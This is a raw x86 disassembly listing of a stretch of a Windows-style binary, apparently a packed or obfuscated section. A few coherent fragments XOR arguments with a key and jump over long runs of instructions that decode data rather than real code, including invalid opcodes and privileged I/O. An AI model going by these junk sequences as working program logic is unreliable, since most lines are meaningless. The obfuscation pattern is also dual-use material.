  409cbc:	out    dx,eax
  409cbd:	add    eax,0x7be83637
  409cc2:	push   0xffffffc5
  409cc4:	test   DWORD PTR [esp+edi*1+0x6b627615],edi
  409ccb:	adc    esp,DWORD PTR [edx]
  409ccd:	jne    0x40a399
  409cd3:	mov    eax,DWORD PTR [ebp+0x8]
  409cd6:	mov    ecx,DWORD PTR [ebp-0x18]
  409cd9:	xor    eax,esi
  409cdb:	add    eax,edi
  409cdd:	cmp    DWORD PTR [ecx],eax
  409cdf:	jne    0x40a344
  409ce5:	mov    eax,DWORD PTR [ebp+0x8]
  409ce8:	jmp    0x40a009
  409ced:	inc    edi
  409cee:	aad    0xe6
  409cf0:	shl    BYTE PTR [ecx+esi*8+0x71],1
  409cf4:	push   ecx
  409cf5:	out    0xaa,eax
  409cf7:	push   esp
  409cf8:	stc    
  409cf9:	aam    0x9
  409cfb:	imul   edx,esp,0x7e7ee374
  409d01:	jp     0x409d80
  409d03:	jle    0x409d83
  409d05:	sub    BYTE PTR [ecx+0x1d],cl
  409d08:	dec    ecx
  409d09:	lahf   
  409d0a:	(bad)  
  409d0b:	or     dl,BYTE PTR [edi]
  409d0d:	mov    cl,0x28
  409d0f:	gs pop edi
  409d11:	mov    dl,0x3a
  409d13:	push   esp
  409d14:	push   ebp
  409d15:	xchg   edx,eax
  409d16:	xchg   edi,esp
  409d18:	jnp    0x409cdd
  409d1a:	xor    dl,BYTE PTR [edi-0x69]
  409d1d:	xor    ebp,0xefacb68d
  409d23:	cmp    DWORD PTR [ebx+eiz*8],eax
  409d26:	dec    dh
  409d28:	mov    al,0xba
  409d2a:	das    
  409d2b:	icebp  
  409d2c:	jo     0x409ce1
  409d2e:	push   ds
  409d2f:	sub    eax,0xe00d2071
  409d34:	mov    eax,0x8c62574c
  409d39:	pop    es
  409d3a:	jno    0x409cf9
  409d3c:	call   0x1b9a:0x3a89a945
  409d43:	imul   esp,esi,0x5704088e
  409d49:	push   ebx
  409d4a:	fidiv  DWORD PTR [edx+0xe]
  409d4d:	bound  ebx,QWORD PTR [edi]
  409d4f:	and    eax,0x180a8eed
  409d54:	add    edi,DWORD PTR [edx]
  409d56:	mov    edx,0xea6677f8
  409d5b:	addr16 jge 0x409d13
  409d5e:	fisub  WORD PTR [ebx]
  409d60:	mov    eax,ds:0x62f67763
  409d65:	jp     0x409d80
  409d67:	out    0x47,al
  409d69:	pop    esp
  409d6a:	adc    eax,ebp
  409d6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d6d:	popa   
  409d6e:	scas   eax,DWORD PTR es:[edi]
  409d6f:	jnp    0x409d13
  409d71:	push   ecx
  409d72:	cmp    ah,BYTE PTR [edx]
  409d74:	mov    dl,0x89
  409d76:	loop   0x409d87
  409d78:	mov    esp,0x42746018
  409d7d:	push   esp
  409d7e:	jb     0x409ddc
  409d80:	leave  
  409d81:	push   eax
  409d82:	mov    bh,0xab
  409d84:	dec    ecx
  409d85:	mov    dh,0xae
  409d87:	adc    DWORD PTR [eax+0x40d8f6b3],ecx
  409d8d:	es sbb al,0x9b
  409d90:	icebp  
  409d91:	jns    0x409ddd
  409d93:	int    0xf0
  409d95:	cmp    al,0xe1
  409d97:	and    BYTE PTR [esi],ah
  409d99:	mov    ds:0x8a6256eb,al
  409d9e:	jmp    0x409e01
  409da0:	add    eax,0x2d183ba8
  409da5:	cwde   
  409da6:	dec    DWORD PTR ss:[eax+eiz*4]
  409daa:	int    0xf1
  409dac:	mov    al,ds:0x5a9b1f3d
  409db1:	push   ss
  409db2:	xchg   edx,eax
  409db3:	jp     0x409d84
  409db5:	or     bl,BYTE PTR [edx]
  409db7:	jmp    0xa6ab5f0a
  409dbc:	pop    esi
  409dbd:	mov    ch,0xf7
  409dbf:	mov    eax,ds:0xa57e824d
  409dc4:	iret   
  409dc5:	pop    ss
  409dc6:	in     eax,dx
  409dc7:	cmp    eax,0x2d0dca94
  409dcc:	or     al,0xbc
  409dce:	push   edi
  409dcf:	in     eax,dx
  409dd0:	leave  
  409dd1:	jge    0x409d5d
  409dd3:	rol    DWORD PTR ds:0xd25a99df,0x4e
  409dda:	dec    ecx
  409ddb:	cmp    eax,0x1246cca4
  409de0:	jb     0x409d83
  409de2:	add    al,0x3b
  409de4:	test   BYTE PTR [bp+di+0x63fd],bh
  409de9:	sbb    al,BYTE PTR [eax+0x76]
  409dec:	inc    ecx
  409ded:	jns    0x409d91
  409def:	repz pop ebx
  409df1:	ds inc ebp
  409df3:	jne    0x409d96
  409df5:	or     bl,BYTE PTR [eax-0x7b796de7]
  409dfb:	cmp    dl,ch
  409dfd:	mov    ecx,0xb4e5deb1
  409e02:	fisub  DWORD PTR [edi]
  409e04:	sbb    al,0x5
  409e06:	icebp  
  409e07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e08:	and    eax,0x5fa9dae
  409e0d:	xchg   esi,ecx
  409e0f:	sti    
  409e10:	les    ebp,FWORD PTR [eax+0x76e3e0a7]
  409e16:	(bad)  
  409e17:	xchg   ecx,eax
  409e18:	mov    esp,0xa71e7abe
  409e1d:	pop    es
  409e1e:	je     0x409e11
  409e20:	in     eax,dx
  409e21:	sub    eax,0xd3e3e751
  409e26:	pop    edx
  409e27:	test   BYTE PTR [esi+0x63d6b1bb],dl
  409e2d:	gs mov bl,0x4
  409e30:	sub    esi,DWORD PTR [eax+edx*8]
  409e33:	sub    DWORD PTR [edi+ebx*4],0x4176da72
  409e3a:	pop    esi
  409e3b:	jns    0x409e89
  409e3d:	jne    0x409e64
  409e3f:	mov    al,0xde
  409e41:	add    eax,0x57fbb805
  409e46:	clc    
  409e47:	push   ss
  409e48:	fiadd  WORD PTR [edx-0x75b0373b]
  409e4e:	lea    ecx,[edi+0x53]
  409e51:	and    eax,0x79f86775
  409e56:	(bad)  
  409e57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e58:	jmp    0x9f948396
  409e5d:	mov    cl,0x7a
  409e5f:	dec    esp
  409e60:	xor    DWORD PTR [esi],0x42
  409e63:	sbb    DWORD PTR [ecx],0xffffffe9
  409e66:	mov    al,cs:0xca6bf9a0
  409e6c:	adc    DWORD PTR [edi+0x49c756cc],0xffffffb3
  409e73:	call   0xe31e4627
  409e78:	inc    ebp
  409e79:	jae    0x409e62
  409e7b:	scas   eax,DWORD PTR es:[edi]
  409e7c:	(bad)  
  409e7d:	mov    bh,0xaa
  409e7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e80:	pop    esp
  409e81:	in     eax,0x8e
  409e83:	lock popf 
  409e85:	imul   ecx,DWORD PTR [edi],0x71
  409e88:	sbb    eax,DWORD PTR [ecx+0x3d]
  409e8b:	and    ecx,edx
  409e8d:	mov    edi,0xb9fe3be1
  409e92:	mov    esi,0x46d7d425
  409e97:	test   bh,bh
  409e99:	mov    edx,0x4b91f8b5
  409e9e:	call   0xedf5:0xb0eb768
  409ea5:	jmp    0xe38a:0xcda9330
  409eac:	dec    ebx
  409ead:	mov    ds:0x1e11c1d0,al
  409eb2:	lods   al,BYTE PTR ds:[esi]
  409eb3:	dec    eax
  409eb4:	inc    edx
  409eb5:	das    
  409eb6:	cli    
  409eb7:	sar    BYTE PTR [edi+0x343a7959],0x99
  409ebe:	push   edi
  409ebf:	loop   0x409eee
  409ec1:	div    DWORD PTR ds:0x792e658f
  409ec7:	mov    ebx,0x76ef9670
  409ecc:	shr    esp,1
  409ece:	inc    esi
  409ecf:	or     BYTE PTR [ebp-0x3f],ah
  409ed2:	add    cl,BYTE PTR [ecx+0xe]
  409ed5:	xor    DWORD PTR [edx],esi
  409ed7:	mov    al,0x51
  409ed9:	call   0xff6d:0x75c550d6
  409ee0:	imul   ebp,ebp,0xffffff81
  409ee3:	add    dh,cl
  409ee5:	ss push cs
  409ee7:	mov    ecx,0x2107a02e
  409eec:	pop    ss
  409eed:	push   0xffffffce
  409eef:	mov    es,WORD PTR [ecx-0x70]
  409ef2:	iret   
  409ef3:	xlat   BYTE PTR ds:[ebx]
  409ef4:	mov    esp,0x2b298529
  409ef9:	jge    0x409f71
  409efb:	(bad)  
  409efc:	enter  0x4c3f,0xd9
  409f00:	pop    esp
  409f01:	jo     0x409ee3
  409f03:	gs das 
  409f05:	mov    bh,0x68
  409f07:	jge    0x409ebd
  409f09:	mov    cl,0x52
  409f0b:	pop    ss
  409f0c:	push   cs
  409f0d:	or     bh,BYTE PTR [edi-0x37]
  409f10:	mov    ch,0x34
  409f12:	popf   
  409f13:	xchg   edx,eax
  409f14:	cmp    cl,0x63
  409f17:	fcomp  DWORD PTR [edi+eax*2]
  409f1a:	inc    edx
  409f1b:	das    
  409f1c:	shl    BYTE PTR ds:0xec023ba7,0x65
  409f23:	outs   dx,DWORD PTR ds:[esi]
  409f24:	je     0x409f75
  409f26:	in     al,0xd6
  409f28:	(bad)  
  409f29:	sbb    ch,BYTE PTR [ecx-0x4]
  409f2c:	shl    dl,0x4d
  409f2f:	sub    esp,DWORD PTR [ecx]
  409f31:	sub    eax,0x44ce195a
  409f36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f37:	pop    ebx
  409f38:	les    ebx,FWORD PTR [eax+0x268de6c1]
  409f3e:	scas   eax,DWORD PTR es:[edi]
  409f3f:	pop    ebp
  409f40:	and    DWORD PTR [edx+0x7c56abbf],ecx
  409f46:	aad    0x54
  409f48:	scas   eax,DWORD PTR es:[edi]
  409f49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f4a:	mov    edi,0x48132773
  409f4f:	rcr    al,cl
  409f51:	jp     0x409f49
  409f53:	cmp    al,BYTE PTR [edi+0x57d469e4]
  409f59:	imul   esp,DWORD PTR [esi+0x5d24f29d],0xc1972009
  409f63:	mov    esi,DWORD PTR [edx]
  409f65:	pop    eax
  409f66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f67:	dec    esi
  409f68:	and    eax,0xf9129ab4
  409f6d:	sti    
  409f6e:	pop    esi
  409f6f:	ja     0x409f8b
  409f71:	adc    ch,ah
  409f73:	daa    
  409f74:	mov    bl,0x8b
  409f76:	test   DWORD PTR [edi-0x34],ebx
  409f79:	sbb    cl,0xea
  409f7c:	je     0x409f61
  409f7e:	or     al,0x36
  409f80:	xor    BYTE PTR ds:0xb74e20a,ah
  409f86:	sbb    al,BYTE PTR [ebp-0x18383982]
  409f8c:	xor    eax,0x5cbe692d
  409f91:	es fcom st(1)
  409f94:	outs   dx,BYTE PTR ds:[esi]
  409f95:	icebp  
  409f96:	retf   
  409f97:	stc    
  409f98:	int    0x56
  409f9a:	sbb    DWORD PTR [eax],esi
  409f9c:	jmp    DWORD PTR [esi]
  409f9e:	xchg   esi,eax
  409f9f:	xchg   ebp,eax
  409fa0:	cmp    BYTE PTR [ebx-0x5ff3ddcf],0x9f
  409fa7:	xor    al,0x57
  409fa9:	idiv   ebx
  409fab:	dec    ebp
  409fac:	or     DWORD PTR [ebp+0x39],eax
  409faf:	mov    eax,ds:0x5b0eeccd
  409fb4:	sbb    BYTE PTR [esi],dl
  409fb6:	fldenv [ebx]
  409fb8:	das    
  409fb9:	stc    
  409fba:	add    ebx,0xa2e9359e
  409fc0:	scas   eax,DWORD PTR es:[edi]
  409fc1:	and    al,0xae
  409fc3:	mov    ds:0x8d4dad91,eax
  409fc8:	int    0xe7
  409fca:	sub    al,BYTE PTR [edx+0x21]
  409fcd:	repz or eax,0x38572b2d
  409fd3:	mov    dh,0x89
  409fd5:	and    DWORD PTR [esi-0x74],ebp
  409fd8:	sub    BYTE PTR [edi],ch
  409fda:	loop   0x40a055
  409fdc:	xor    esp,ecx
  409fde:	ins    DWORD PTR es:[edi],dx
  409fdf:	popf   
  409fe0:	dec    ebp
  409fe1:	mov    bh,0x32
  409fe3:	cmp    DWORD PTR [ebx],esp
  409fe5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fe6:	pop    esi
  409fe7:	mov    dh,0x8d
  409fe9:	out    dx,al
  409fea:	ins    DWORD PTR es:[edi],dx
  409feb:	dec    ebx
  409fec:	aam    0x7b
  409fee:	(bad)  
  409fef:	jmp    DWORD PTR [ecx]
  409ff1:	jns    0x409fe9
  409ff3:	pusha  
  409ff4:	ret    
  409ff5:	or     al,0xc1
  409ff7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ff8:	sbb    DWORD PTR [ebp-0x4],edx
  409ffb:	hlt    
  409ffc:	xchg   esi,eax
  409ffd:	dec    esp
  409ffe:	sti    
  409fff:	mov    ecx,DWORD PTR [ebx]
  40a001:	std    
  40a002:	clc    
  40a003:	xor    al,0x42
  40a005:	scas   al,BYTE PTR es:[edi]
  40a006:	adc    eax,edi
  40a008:	mov    ecx,0x33f04d8b
  40a00d:	mov    BYTE PTR [ebx],0xc7
  40a010:	mov    DWORD PTR [ecx],eax
  40a012:	mov    eax,DWORD PTR [ebp-0x10]
  40a015:	mov    ecx,DWORD PTR [ebp+0x10]
  40a018:	jmp    0x40a339
  40a01d:	enter  0xca7a,0x5
  40a021:	enter  0xd1d5,0xd3
  40a025:	sbb    esi,esp
  40a027:	mul    DWORD PTR [ebx+0x3]
  40a02a:	test   DWORD PTR [esi-0x62],esp
  40a02d:	jo     0x40a01d
  40a02f:	jle    0x40a0af
  40a031:	jp     0x40a0b0
  40a033:	jle    0x40a0b3
  40a035:	nop
  40a036:	mov    dh,0x2e
  40a038:	ins    BYTE PTR es:[edi],dx
  40a039:	mov    ch,0x41
  40a03b:	xchg   ebx,eax
  40a03c:	xor    DWORD PTR [ebx-0x446eaefb],0xbbd3a876
  40a046:	imul   ebx,DWORD PTR [ecx-0x36858cf2],0x6
  40a04d:	(bad)
  40a052:	pop    edi
  40a053:	shufps xmm0,xmm1,0x62
  40a057:	mov    dh,0x29
  40a059:	outs   dx,DWORD PTR gs:[esi]
  40a05b:	xchg   ebx,eax
  40a05c:	adc    BYTE PTR [ebx],0x29
  40a05f:	ins    DWORD PTR es:[edi],dx
  40a060:	jno    0x40a001
  40a062:	dec    edx
  40a063:	xchg   BYTE PTR [esi-0x25],al
  40a066:	push   cs
  40a067:	call   FWORD PTR [eax+0x11]
  40a06a:	mov    dl,BYTE PTR [ebp+0x3e]
  40a06d:	leave  
  40a06e:	jbe    0x40a062
  40a070:	(bad)  
  40a071:	test   al,0xa6
  40a073:	fnstsw WORD PTR [esi]
  40a075:	push   ss
  40a076:	cwde   
  40a077:	push   ss
  40a078:	fimul  WORD PTR ss:[ebx]
  40a07b:	mov    ds:0xfd484911,al
  40a080:	mov    eax,0xd36c5be5
  40a085:	mov    DWORD PTR [ebp+0x76b70789],edi
  40a08b:	fsubr  st(0),st
  40a08d:	add    bl,BYTE PTR [ebx-0x5c]
  40a090:	dec    ebx
  40a091:	push   ecx
  40a092:	pop    ds
  40a093:	(bad)  
  40a094:	rcl    DWORD PTR [ecx+0x42641589],1
  40a09a:	daa    
  40a09b:	xchg   edx,eax
  40a09c:	fwait
  40a09d:	adc    BYTE PTR [edx-0x354ad64d],dl
  40a0a3:	jmp    0x94fd:0x11826911
  40a0aa:	and    al,0xbb
  40a0ac:	xor    edx,ebx
  40a0ae:	and    DWORD PTR [edi],esi
  40a0b0:	and    cl,BYTE PTR [ecx-0x41]
  40a0b3:	mov    dh,0xbd
  40a0b5:	inc    edi
  40a0b6:	and    eax,0xcfa74ed4
  40a0bb:	pop    ss
  40a0bc:	pop    ss
  40a0bd:	sub    BYTE PTR [ecx-0x15d186ce],cl
  40a0c3:	add    eax,0x4698fe8b
  40a0c8:	icebp  
  40a0c9:	cmp    bh,BYTE PTR [ecx+0x27b0e293]
  40a0cf:	jp     0x40a0ba
  40a0d1:	dec    esi
  40a0d2:	adc    ax,0x8963
  40a0d6:	jo     0x40a10c
  40a0d8:	jne    0x40a073
  40a0da:	push   edi
  40a0db:	out    dx,eax
  40a0dc:	jbe    0x40a0dd
  40a0de:	push   0x25
  40a0e0:	in     eax,dx
  40a0e1:	lods   al,BYTE PTR ds:[esi]
  40a0e2:	int3   
  40a0e3:	(bad)  
  40a0e5:	xchg   esi,eax
  40a0e6:	adc    eax,0xcb764445
  40a0eb:	adc    BYTE PTR gs:[edx+0x16e4c0d0],bh
  40a0f2:	push   esp
  40a0f3:	jbe    0x40a0e6
  40a0f5:	inc    edi
  40a0f6:	retf   
  40a0f7:	xchg   ebx,eax
  40a0f8:	mov    ds:0x452e20f,eax
  40a0fd:	das    
  40a0fe:	and    ah,BYTE PTR [esi+0xc]
  40a101:	or     DWORD PTR [ebx+0x1d8ba76c],eax
  40a107:	lds    edx,FWORD PTR [ebp+0x73]
  40a10a:	cs repnz xchg esp,eax
  40a10d:	and    dh,BYTE PTR [eax-0x25]
  40a110:	(bad)  
  40a111:	inc    BYTE PTR [esi]
  40a113:	pop    edx
  40a114:	out    dx,eax
  40a115:	jge    0x40a184
  40a117:	leave  
  40a118:	jae    0x40a162
  40a11a:	mov    cl,0xcb
  40a11c:	fld    QWORD PTR [ecx-0x49b7b9df]
  40a122:	pop    edi
  40a123:	or     esp,DWORD PTR [esi+ebp*1+0x6f2ea95d]
  40a12a:	cwde   
  40a12b:	xchg   edx,eax
  40a12c:	and    edi,DWORD PTR ds:[ecx]
  40a12f:	cli    
  40a130:	clc    
  40a131:	inc    ebp
  40a132:	xor    dh,0xb3
  40a135:	aam    0xe3
  40a137:	and    eax,0xbf7a5a3e
  40a13c:	clc    
  40a13d:	test   DWORD PTR [ebx+0x9],esi
  40a140:	ins    BYTE PTR es:[edi],dx
  40a141:	inc    esi
  40a142:	inc    eax
  40a143:	(bad)  
  40a144:	iret   
  40a145:	cli    
  40a146:	mov    WORD PTR [ebx+0x2e],es
  40a149:	aas    
  40a14a:	lods   eax,DWORD PTR ds:[esi]
  40a14b:	retf   
  40a14c:	xchg   ebp,eax
  40a14d:	shl    BYTE PTR [eax+ebx*8-0x20cfe692],0x44
  40a155:	mov    bl,0x5e
  40a157:	ja     0x40a173
  40a159:	mov    dh,0xd8
  40a15b:	addr16 cmp al,0x43
  40a15e:	js     0x40a169
  40a160:	xchg   edx,eax
  40a161:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a162:	enter  0x4931,0x13
  40a166:	jbe    0x40a1df
  40a168:	ror    eax,1
  40a16a:	js     0x40a11d
  40a16c:	cmp    DWORD PTR [edx+ebp*8+0x7],esi
  40a170:	inc    ebx
  40a171:	add    edx,DWORD PTR ds:0xee11e9f5
  40a177:	inc    esi
  40a178:	xor    ebx,DWORD PTR [edi-0x20]
  40a17b:	pop    es
  40a17c:	cmp    ebp,DWORD PTR [esi]
  40a17e:	popf   
  40a17f:	mov    dh,0x0
  40a181:	outs   dx,BYTE PTR ds:[esi]
  40a182:	jecxz  0x40a164
  40a184:	imul   edi,ecx,0x1c
  40a187:	xor    al,0x5f
  40a189:	sbb    BYTE PTR [ebx+esi*2-0x27],cl
  40a18d:	loopne 0x40a14e
  40a18f:	and    ecx,DWORD PTR [edx-0xa]
  40a192:	pop    ebx
  40a193:	or     eax,esi
  40a195:	xchg   esp,esp
  40a197:	pop    es
  40a198:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a19a:	mov    ds:0xa4f081bb,eax
  40a19f:	mov    bh,0xfd
  40a1a1:	jge    0x40a14b
  40a1a3:	jl     0x40a16b
  40a1a5:	outs   dx,BYTE PTR ds:[esi]
  40a1a6:	push   esp
  40a1a7:	les    edi,FWORD PTR [edi]
  40a1a9:	add    ebx,DWORD PTR [edi-0x1b]
  40a1ac:	mov    eax,ds:0x5b7a5832
  40a1b1:	into   
  40a1b2:	jecxz  0x40a1e1
  40a1b4:	push   ds
  40a1b5:	and    al,0xef
  40a1b7:	test   DWORD PTR [edx],edi
  40a1b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1ba:	int    0xa2
  40a1bc:	add    eax,0xc88597
  40a1c1:	pop    ecx
  40a1c2:	sbb    al,0x39
  40a1c4:	mov    ds:0xbbbb3c45,eax
  40a1c9:	sti    
  40a1ca:	xchg   ecx,eax
  40a1cb:	(bad)  
  40a1cc:	sar    DWORD PTR [eax],1
  40a1ce:	xchg   ebp,eax
  40a1cf:	cs stos DWORD PTR es:[edi],eax
  40a1d1:	cmp    esp,DWORD PTR [ecx-0x70]
  40a1d4:	and    al,0x43
  40a1d6:	cmp    bl,BYTE PTR ds:0xdbbe576
  40a1dc:	sbb    eax,DWORD PTR [ecx]
  40a1de:	cli    
  40a1df:	ret    0xd664
  40a1e2:	pusha  
  40a1e3:	xlat   BYTE PTR ds:[ebx]
  40a1e4:	mov    ds:0xe413ed42,eax
  40a1e9:	jns    0x40a196
  40a1eb:	xchg   edi,eax
  40a1ec:	popf   
  40a1ed:	add    eax,0x51d7a5a0
  40a1f2:	mov    ss,WORD PTR [edx-0x35]
  40a1f5:	add    cl,BYTE PTR [edx-0x6a]
  40a1f8:	sub    eax,0xd48e3567
  40a1fd:	lock xchg ebx,eax
  40a1ff:	loop   0x40a181
  40a201:	add    cl,BYTE PTR [edi]
  40a203:	cwde   
  40a204:	repnz sub al,0x69
  40a207:	inc    eax
  40a208:	sbb    DWORD PTR [ecx-0x46],ebx
  40a20b:	popf   
  40a20c:	sbb    dh,BYTE PTR [esi]
  40a20e:	mov    bl,0x82
  40a210:	imul   edi,DWORD PTR [ebx-0x42],0x37
  40a214:	mov    ecx,0x94ea01d8
  40a219:	pop    edx
  40a21a:	(bad)  
  40a21b:	lods   al,BYTE PTR ds:[esi]
  40a21c:	add    BYTE PTR [edi-0x695f6669],dl
  40a222:	pop    edx
  40a223:	retf   
  40a224:	or     al,0x17
  40a226:	(bad)  
  40a227:	jl     0x40a231
  40a229:	dec    ecx
  40a22a:	cmp    ebp,edx
  40a22c:	push   edx
  40a22d:	daa    
  40a22e:	xchg   DWORD PTR [ebp-0x7c5bdbe7],esi
  40a234:	adc    al,0x7a
  40a236:	xchg   ebx,eax
  40a237:	cmp    cl,BYTE PTR ds:0x7347b1eb
  40a23d:	push   es
  40a23e:	pushf  
  40a23f:	gs mov bl,0xb6
  40a242:	cmp    esi,DWORD PTR [edx-0x75]
  40a245:	ffreep st(7)
  40a247:	lods   al,BYTE PTR ds:[esi]
  40a248:	pop    DWORD PTR [esi+0x26]
  40a24b:	and    ah,0x94
  40a24e:	jg     0x40a250
  40a250:	in     al,dx
  40a251:	sbb    bl,dh
  40a253:	mov    WORD PTR [esi-0x11],cs
  40a256:	pop    ecx
  40a257:	mov    dh,0x26
  40a259:	test   al,0x57
  40a25b:	js     0x40a2c9
  40a25d:	pop    ebp
  40a25e:	inc    edx
  40a25f:	std    
  40a260:	aaa    
  40a261:	idiv   ah
  40a263:	hlt    
  40a264:	add    al,0x34
  40a266:	mov    eax,ds:0x806e2294
  40a26b:	mov    ebp,0xe7f14902
  40a270:	test   cl,0x1d
  40a273:	popa   
  40a274:	jg     0x40a286
  40a276:	jg     0x40a2d8
  40a278:	mov    al,ds:0xf0615a6e
  40a27d:	inc    ebx
  40a27e:	ds mov bl,0x2e
  40a281:	mov    eax,DWORD PTR [eax+0x1f]
  40a284:	or     bl,ch
  40a286:	mov    esi,DWORD PTR [edx-0x2944e70e]
  40a28c:	and    BYTE PTR [eax],al
  40a28e:	mov    ah,0xd3
  40a290:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a291:	xchg   edx,eax
  40a292:	adc    esp,eax
  40a294:	xor    al,0x2
  40a296:	in     eax,0x15
  40a298:	repz rcr BYTE PTR [edi],1
  40a29b:	push   edi
  40a29c:	or     esi,ebp
  40a29e:	cli    
  40a29f:	xor    BYTE PTR [esi],0x22
  40a2a2:	es aas 
  40a2a4:	outs   dx,DWORD PTR ds:[esi]
  40a2a5:	retf   
  40a2a6:	mov    al,0x92
  40a2a8:	pop    ecx
  40a2a9:	js     0x40a2ee
  40a2ab:	and    DWORD PTR [ebx-0x1],esi
  40a2ae:	dec    esi
  40a2af:	jb     0x40a2e2
  40a2b1:	xor    eax,0x508fd0b
  40a2b6:	cmp    eax,0x4420c323
  40a2bb:	adc    al,0x50
  40a2bd:	scas   eax,DWORD PTR es:[edi]
  40a2be:	xlat   BYTE PTR ds:[ebx]
  40a2bf:	jo     0x40a311
  40a2c1:	push   esp
  40a2c2:	pop    edi
  40a2c3:	mov    esp,0xa04a9969
  40a2c8:	scas   eax,DWORD PTR es:[edi]
  40a2c9:	dec    ebx
  40a2ca:	pop    esi
  40a2cb:	sub    al,BYTE PTR [ebp+0x8]
  40a2ce:	fsubr  st,st(6)
  40a2d0:	dec    ecx
  40a2d1:	cmp    ecx,ebx
  40a2d3:	mov    ds:0x1948febc,eax
  40a2d8:	scas   al,BYTE PTR es:[edi]
  40a2d9:	jne    0x40a30f
  40a2db:	int    0xfd
  40a2dd:	push   eax
  40a2de:	mov    edi,0x321f31b5
  40a2e3:	aaa    
  40a2e4:	out    0x20,al
  40a2e6:	mul    DWORD PTR [edx]
  40a2e8:	adc    esi,0x11bab0eb
  40a2ee:	test   al,0x1b
  40a2f0:	out    dx,eax
  40a2f1:	clc    
  40a2f2:	inc    ecx
  40a2f3:	mov    ds:0x64ecc1c5,eax
  40a2f8:	sar    BYTE PTR [ecx-0x58d8a2de],1
  40a2fe:	inc    edx
  40a2ff:	sub    bh,BYTE PTR ds:[ebx+eiz*8]
  40a303:	cmc    
  40a304:	jge    0x40a2bb
  40a306:	adc    DWORD PTR [ecx+0xac86b63],edi
  40a30c:	leave  
  40a30d:	mov    cl,0xae
  40a30f:	push   ss
  40a310:	mov    cl,0x72
  40a312:	mov    edx,0x4e0cad1d
  40a317:	inc    eax
  40a318:	and    eax,0x702947da
  40a31d:	cmp    al,0x3
  40a31f:	mov    eax,ds:0x8d0ac0ab
  40a324:	in     al,dx
  40a325:	movq   QWORD PTR [eax],mm4
  40a328:	jge    0x40a2de
  40a32a:	cs sbb eax,0x4ec97a12
  40a330:	xchg   ebx,eax
  40a331:	adc    DWORD PTR [edi-0x36],ebx
  40a334:	mov    al,ds:0xd5c1ea40
  40a339:	xor    ecx,esi
  40a33b:	mov    edx,0xffcd8d65
  40a340:	sub    edx,ecx
  40a342:	add    DWORD PTR [eax],edx
  40a344:	mov    eax,ds:0x413cb2
  40a349:	mov    eax,DWORD PTR [eax]
  40a34b:	mov    cx,WORD PTR [ebp-0x4]
  40a34f:	movzx  ecx,cx
  40a352:	add    ecx,DWORD PTR [eax]
  40a354:	mov    DWORD PTR [ebp-0x18],ecx
  40a357:	mov    eax,DWORD PTR [ebp+0xc]
  40a35a:	mov    ecx,DWORD PTR [ebp+0xc]
  40a35d:	xor    eax,esi
  40a35f:	add    eax,eax
  40a361:	xor    ecx,esi
  40a363:	sub    ecx,eax
  40a365:	mov    ax,WORD PTR [ebp-0x4]
  40a369:	movzx  eax,ax
  40a36c:	sub    ecx,edi
  40a36e:	cmp    eax,ecx
  40a370:	mov    eax,DWORD PTR [ebp+0x10]
  40a373:	movzx  ecx,WORD PTR [ebp-0x4]
  40a377:	jg     0x40a38c
  40a37d:	xor    eax,esi
  40a37f:	sub    ecx,eax
  40a381:	sub    ecx,edi
  40a383:	mov    WORD PTR [ebp-0x4],cx
  40a387:	jmp    0x40a399
  40a38c:	xor    eax,esi
  40a38e:	lea    eax,[eax+ecx*1+0x32729b]
  40a395:	mov    WORD PTR [ebp-0x4],ax
  40a399:	mov    eax,DWORD PTR [ebp-0xc]
  40a39c:	cmp    eax,ebx
  40a39e:	je     0x40a3b2
  40a3a4:	mov    eax,DWORD PTR [ebp-0x8]
  40a3a7:	mov    DWORD PTR [eax],0x60341e89
  40a3ad:	jmp    0x40c082
  40a3b2:	mov    eax,DWORD PTR [ebp+0x8]
  40a3b5:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3b8:	xor    eax,esi
  40a3ba:	jmp    0x40a6db
  40a3bf:	retf   0x3136
  40a3c2:	out    dx,al
  40a3c3:	icebp  
  40a3c4:	jmp    0x20e2d69a
  40a3c9:	inc    ebx
  40a3ca:	popf   
  40a3cb:	shl    DWORD PTR [edi],cl
  40a3cd:	pop    es
  40a3ce:	xor    edi,DWORD PTR [edx+ebp*8+0x7e]
  40a3d2:	jle    0x40a44e
  40a3d4:	jge    0x40a454
  40a3d6:	jle    0x40a449
  40a3d8:	(bad)  
  40a3d9:	outs   dx,BYTE PTR ds:[esi]
  40a3da:	or     al,BYTE PTR [ebp+0x4c]
  40a3dd:	sbb    eax,DWORD PTR [ecx-0x10]
  40a3e0:	test   BYTE PTR [esi+0x281e9af2],dh
  40a3e6:	icebp  
  40a3e7:	sti    
  40a3e8:	push   ebx
  40a3e9:	pusha  
  40a3ea:	aam    0x7a
  40a3ec:	xor    al,0xda
  40a3ee:	or     esi,ebx
  40a3f0:	mov    edx,0xf0e297f9
  40a3f5:	out    dx,al
  40a3f6:	jmp    0x3ca0d7a6
  40a3fb:	mov    dh,0xa8
  40a3fd:	rol    DWORD PTR [ebp-0x45],cl
  40a400:	sub    eax,0xf93e819b
  40a405:	(bad)  
  40a407:	(bad)  
  40a408:	jmp    FWORD PTR [eax-0x2]
  40a40b:	imul   ecx,ebp,0xd5d61e90
  40a411:	push   eax
  40a412:	push   edx
  40a413:	sbb    ch,BYTE PTR [edi+eiz*8-0x4726ce3]
  40a41a:	lods   eax,DWORD PTR ds:[esi]
  40a41b:	or     DWORD PTR [esp+ebx*8-0x5d],ebp
  40a41f:	xadd   BYTE PTR [edi+0x7625429e],al
  40a426:	lods   eax,DWORD PTR ds:[esi]
  40a427:	xchg   edi,eax
  40a428:	(bad)  
  40a429:	or     edi,DWORD PTR [ebp-0x1b0c15ed]
  40a42f:	push   ds
  40a430:	popf   
  40a431:	mov    edx,0x16564502
